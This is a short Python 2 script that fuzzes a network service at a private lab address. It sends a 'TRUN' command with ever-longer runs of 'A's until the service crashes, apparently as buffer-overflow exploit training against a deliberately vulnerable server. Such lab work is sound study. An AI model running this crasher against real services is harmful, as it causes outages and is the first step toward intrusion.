#!/usr/bin/python2
#did the above because this script wasn't working in python3
#fix for python3 later
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.111',9999))   #could make these input variables later

        s.send(('TRUN /.:/' + buffer)) #/.:/ appeared in debugger before A's, so keep it
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()

